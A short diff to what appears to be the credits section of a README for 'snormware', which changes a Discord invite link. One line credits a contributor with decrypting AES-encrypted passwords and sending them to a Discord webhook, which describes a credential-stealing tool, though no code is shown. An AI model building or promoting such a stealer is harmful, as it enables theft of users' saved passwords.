@@ -66,7 +66,7 @@ https://github.com/S-illy | Made it look cleaner and added commands regarding to
 
 https://github.com/UnsillyHaxor | Made the main process. ( decrypting the passwords that are encrypted in AES and sending it to the discord webhook and THE CMDS. ( Silly made 4 )
 
-https://discord.gg/3Q6nJQYgMB 
+https://discord.gg/snormware
 
 https://www.youtube.com/@snormware |
 
